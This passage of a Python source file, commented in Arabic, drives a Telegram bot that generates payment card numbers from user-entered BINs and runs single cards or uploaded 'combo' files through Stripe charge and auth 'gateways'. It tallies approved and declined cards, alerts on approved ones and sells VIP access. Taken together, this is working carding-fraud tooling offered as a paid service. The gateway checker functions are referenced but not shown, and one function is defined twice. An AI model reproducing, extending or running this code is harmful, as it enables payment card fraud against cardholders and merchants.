        bot.reply_to(message, "تم إلغاء جلسة التوليد.")
        return

    # استخراج كل سطر لا يبدأ بـ / ويكون رقماً من 6 خانات على الأقل
    bins = []
    for line in message.text.splitlines():
        line = line.strip()
        if not line or line.startswith('/'):
            continue
        # نأخذ أول 6 أرقام فقط (حتى لو أرسل أطول)
        digits = re.sub(r'\D', '', line)
        if len(digits) >= 6:
            bins.append(digits[:6])

    if not bins:
        bot.reply_to(message, "لم يتم إدخال أي BIN صحيح (تم تجاهل الأسطر التي تبدأ بـ /). استخدم /genn مجدداً.")
        return

    # حفظ BINs في البيانات المؤقتة
    user_temp_data[message.from_user.id] = bins
    msg = bot.reply_to(message, "كم العدد الإجمالي للبطاقات؟ (الحد الأقصى 1000 بطاقة)")
    bot.register_next_step_handler(msg, process_genn_count)


def process_genn_count(message):
    if message.text.startswith('/'):
        bot.reply_to(message, "تم إلغاء جلسة التوليد.")
        return

    try:
        total = int(message.text.strip())
    except:
        return bot.reply_to(message, "الرجاء إدخال رقم صحيح")

    if total < 1 or total > 1000:
        return bot.reply_to(message, "العدد يجب أن يكون بين 1 و 1000")

    user_id = message.from_user.id
    bins = user_temp_data.pop(user_id, None)
    if not bins:
        return bot.reply_to(message, "انتهت الجلسة، استخدم /genn مرة أخرى")

    # توزيع العدد الإجمالي على BINs
    base = total // len(bins)
    extra = total % len(bins)

    msg = bot.reply_to(message, f"جاري توليد {total} بطاقة...")
    all_cards = []

    for i, bin_val in enumerate(bins):
        count = base + (1 if i < extra else 0)
        if count == 0:
            continue
        try:
            cards = generate_cards(bin_val, count)
            all_cards.extend(cards)
        except Exception as e:
            bot.reply_to(message, f"خطأ مع BIN {bin_val}: {e}")
            return

    random.shuffle(all_cards)

    if not all_cards:
        return bot.reply_to(message, "لم يتم توليد أي بطاقة.")

    filename = f"genned_{user_id}.txt"
    with open(filename, 'w', encoding='utf-8') as f:
        f.write('\n'.join(all_cards))

    with open(filename, 'rb') as f:
        bot.send_document(message.chat.id, f, caption=f"تم توليد {len(all_cards)} بطاقة من {len(bins)} BIN")
    os.remove(filename)
    bot.delete_message(msg.chat.id, msg.message_id)

def process_genn_count(message):
    try:
        total = int(message.text.strip())
    except:
        return bot.reply_to(message, "الرجاء إدخال رقم صحيح")

    if total < 1 or total > 1000:
        return bot.reply_to(message, "العدد يجب أن يكون بين 1 و 1000")

    user_id = message.from_user.id
    bins = user_temp_data.pop(user_id, None)
    if not bins:
        return bot.reply_to(message, "انتهت الجلسة، استخدم /genn مرة أخرى")

    # حساب عدد البطاقات لكل BIN (توزيع متساوٍ)
    base = total // len(bins)          # العدد الأساسي لكل BIN
    extra = total % len(bins)          # عدد الـ BINs التي ستأخذ بطاقة إضافية

    msg = bot.reply_to(message, f"جاري توليد {total} بطاقة...")
    all_cards = []
    for i, bin_val in enumerate(bins):
        count = base + (1 if i < extra else 0)
        if count == 0:
            continue
        try:
            cards = generate_cards(bin_val, count)
            all_cards.extend(cards)
        except Exception as e:
            bot.reply_to(message, f"خطأ مع BIN {bin_val}: {e}")
            return

    random.shuffle(all_cards)

    if not all_cards:
        return bot.reply_to(message, "لم يتم توليد أي بطاقة.")

    filename = f"genned_{user_id}.txt"
    with open(filename, 'w', encoding='utf-8') as f:
        f.write('\n'.join(all_cards))

    with open(filename, 'rb') as f:
        bot.send_document(message.chat.id, f, caption=f"تم توليد {len(all_cards)} بطاقة من {len(bins)} BIN")
    os.remove(filename)
    bot.delete_message(msg.chat.id, msg.message_id)
@bot.message_handler(commands=['status'])
def status_cmd(message):
    user_id = message.from_user.id
    plan, expiry = check_subscription(user_id)
    if plan == "FREE":
        text = "مجاني.\n/buy"
    else:
        remaining = ""
        if expiry:
            delta = expiry - datetime.now()
            days = delta.days
            hours = delta.seconds // 3600
            remaining = f"{days} يوم و {hours} ساعه"
        text = f"VIP\nالصلاحية: {expiry.strftime('%Y-%m-%d %H:%M') if expiry else 'غير محدده'}\nمتبقي: {remaining}"
    bot.reply_to(message, text)

# ============================================================
# فحوصات يدوية عامة (مع عرض الـ ms والـ code منفصلين)
# ============================================================
def run_manual_check(message, card, func, gateway_name, user_id, username):
    msg = bot.reply_to(message, "جاري الفحص...")
    try:
        res = func(card)
    except Exception as e:
        res = f"Error: {e}"
    
    match = re.search(r'\((.*?)\)\s*$', res)
    if match:
        code_part = match.group(1)
        msg_part = res[:match.start()].strip()
    else:
        msg_part = res
        code_part = ""
    
    binfo = get_bin_info(card)
    output = f"<code>{card}</code>\nResult: {msg_part}"
    if code_part:
        output += f"\nCode: {code_part}"
    output += f"\nBank: {binfo['bank']}\nCountry: {binfo['country']} {binfo['emoji']}\nBrand: {binfo['brand']} | BIN: {card[:6]}"
    bot.edit_message_text(output, msg.chat.id, msg.message_id)
    
    if is_approved_result(res):
        notify_approved(card, gateway_name, res, user_id, username)

# معالج عام للأوامر غير المعروفة (يدعم البوابات المدمجة والمخصصة) - يوضع بعد كل الأوامر المحددة
# ============================================================
# معالج عام للأوامر (مع رفض البوابات المعطلة)
# ============================================================
@bot.message_handler(func=lambda m: m.text and m.text.startswith('/'))
def handle_commands_generic(message):
    parts = message.text.split(' ')
    cmd = parts[0][1:]
    if len(parts) < 2:
        return
    card = parts[1]
    user_id = message.from_user.id
    if is_banned(user_id):
        return
    plan, _ = check_subscription(user_id)
    if config.get('force_subscription') and plan == "FREE" and not is_admin(user_id):
        bot.reply_to(message, "VIP مطلوب.")
        return

    # رفض البوابات المدمجة المعطلة
    disabled = config.get('disabled_portals', [])
    if cmd in disabled:
        bot.reply_to(message, "هذه البوابة معطلة حالياً")
        return

    if cmd == 'st':
        checker = get_user_session(user_id)
        run_manual_check(message, card, checker.Payment, "Stripe Auth", user_id, message.from_user.username)
    elif cmd == 'py':
        run_manual_check(message, card, py_check, "stripe charge 10$", user_id, message.from_user.username)
    elif cmd == 'ha':
        run_manual_check(message, card, ha_check, "stripe charge 5$", user_id, message.from_user.username)
    elif cmd == 'br':
        run_manual_check(message, card, br_check, "Stripe charge 1$", user_id, message.from_user.username)
    elif cmd in portal_modules:
        mod = portal_modules[cmd]
        gateway_name = portal_commands[cmd]
        run_manual_check(message, card, mod.check, gateway_name, user_id, message.from_user.username)

# ============================================================
# استقبال ملفات - أزرار جميع البوابات (تتجاهل المعطلة)
# ============================================================
@bot.message_handler(content_types=['document'])
def handle_file(message):
    user_id = message.from_user.id
    if is_banned(user_id): return
    cfg = load_config()
    plan, expiry = check_subscription(user_id)
    if cfg.get('force_subscription') and plan == "FREE" and not is_admin(user_id):
        return bot.reply_to(message, "VIP مطلوب.")
    if expiry and datetime.now() > expiry:
        return bot.reply_to(message, "انتهى الاشتراك.")
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded = bot.download_file(file_info.file_path)
        with open(f"combo_{user_id}.txt", "wb") as f:
            f.write(downloaded)
        markup = types.InlineKeyboardMarkup(row_width=2)
        disabled = config.get('disabled_portals', [])
        # أزرار مستقلة لكل بوابة
        if 'st' not in disabled:
            markup.add(types.InlineKeyboardButton("Stripe Auth", callback_data='start_check_st', style="success"))
        if 'py' not in disabled:
            markup.add(types.InlineKeyboardButton("stripe charge 10$", callback_data='start_check_py', style="success"))
        if 'ha' not in disabled:
            markup.add(types.InlineKeyboardButton("stripe charge 5$", callback_data='start_check_ha', style="success"))
        if 'br' not in disabled:
            markup.add(types.InlineKeyboardButton("Stripe charge 1$", callback_data='start_check_br', style="success"))
        # البوابات المخصصة
        for name, info in load_portals().items():
            if info.get('active', True):
                markup.add(types.InlineKeyboardButton(name, callback_data=f"start_check_{name}", style="success"))
        bot.reply_to(message, "اختر البوابة:", reply_markup=markup)
    except Exception as e:
        bot.reply_to(message, f"خطا: {e}")
def run_file_check(call, gateway_func, gateway_name):
    user_id = call.from_user.id
    event = threading.Event()
    stop_events[str(user_id)] = event

    combo_file = f"combo_{user_id}.txt"
    if not os.path.exists(combo_file):
        bot.edit_message_text("ملف غير موجود", call.message.chat.id, call.message.message_id)
        stop_events.pop(str(user_id), None)
        return
    with open(combo_file, 'r', encoding='utf-8', errors='ignore') as f:
        cards = [l.strip() for l in f if l.strip()]
    total = len(cards)
    if total == 0:
        bot.edit_message_text("فارغ", call.message.chat.id, call.message.message_id)
        stop_events.pop(str(user_id), None)
        return

    approved = declined = error = 0
    bot.edit_message_text(f"جاري فحص {gateway_name}...", call.message.chat.id, call.message.message_id)

    for idx, card in enumerate(cards, 1):
        if event.is_set():
            bot.edit_message_text("تم الايقاف", call.message.chat.id, call.message.message_id)
            break

        res = gateway_func(card)

        if is_approved_result(res):
            approved += 1
            notify_approved(card, gateway_name, res, user_id, call.from_user.username)
        elif is_declined_result(res):
            declined += 1
        else:
            error += 1

        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(types.InlineKeyboardButton(f"{card}", callback_data='none'))
        markup.add(types.InlineKeyboardButton(f"{res}", callback_data='none'))
        markup.add(
            types.InlineKeyboardButton(f"Approved {approved}", callback_data='none', style="success"),
            types.InlineKeyboardButton(f"Declined {declined}", callback_data='none', style="danger")
        )
        markup.add(types.InlineKeyboardButton(f"Error {error}", callback_data='none', style="primary"))
        markup.add(types.InlineKeyboardButton(f"متبقي {total - idx}/{total}", callback_data='none', style="primary"))

        # اسم آمن لزر الإيقاف (بدون مسافات أو رموز)
        safe_name = gateway_name.replace(' ', '_').replace('$', 's')
        markup.add(types.InlineKeyboardButton("ايقاف", callback_data=f'stop_check_{safe_name}', style="danger"))

        try:
            bot.edit_message_text(
                f"{idx}/{total} | Approved {approved} | Declined {declined} | Error {error}",
                call.message.chat.id, call.message.message_id, reply_markup=markup)
        except:
            pass
        time.sleep(1)

    os.remove(combo_file)
    stop_events.pop(str(user_id), None)
    final = f"انتهى\nApproved {approved} | Declined {declined} | Error {error} | Total {total}"
    try:
        bot.edit_message_text(final, call.message.chat.id, call.message.message_id)
    except:
        pass
@bot.callback_query_handler(func=lambda call: call.data == 'start_check_st')
def start_check_st_cb(call):
    checker = get_user_session(call.from_user.id)
    needed = 50 - len(checker.sessions)
    if needed > 0:
        for i in range(needed):
            try: checker.regester()
            except: pass
            time.sleep(0.5)
    run_file_check(call, checker.Payment, "Stripe Auth")

@bot.callback_query_handler(func=lambda call: call.data == 'start_check_py')
def start_check_py_cb(call): run_file_check(call, py_check, "stripe charge 10$")
@bot.callback_query_handler(func=lambda call: call.data == 'start_check_ha')
def start_check_ha_cb(call): run_file_check(call, ha_check, "stripe charge 5$")
@bot.callback_query_handler(func=lambda call: call.data == 'start_check_br')
def start_check_br_cb(call): run_file_check(call, br_check, "Stripe charge 1$")
@bot.callback_query_handler(func=lambda call: call.data.startswith('start_check_'))
def start_check_custom(call):
    portal_name = call.data.split('start_check_')[1]
    portals = load_portals()
    if portal_name not in portals: return
    info = portals[portal_name]
    if not info.get('active', True): return
    cmd = info['command']
    mod = portal_modules.get(cmd)
    if mod: run_file_check(call, mod.check, portal_name)
@bot.callback_query_handler(func=lambda call: call.data.startswith('stop_check_'))
def stop_checks_cb(call):
    user_id = str(call.from_user.id)
    event = stop_events.get(user_id)
    if event:
        event.set()
    bot.answer_callback_query(call.id, "ايقاف...")
@bot.callback_query_handler(func=lambda call: call.data in ['none','plan'])
def dummy_cb(call): bot.answer_callback_query(call.id)

# ============================================================
# تشغيل البوت
# ============================================================
print(Fore.GREEN + f"Started! {BOT_CREATOR} ({BOT_USERNAME})")
try:
    bot.remove_webhook()
except:
    pass
while True:
    try:
        bot.polling(none_stop=True, interval=1, timeout=30)
    except Exception as e:
        print(Fore.RED + f"Error: {e}")
        time.sleep(10)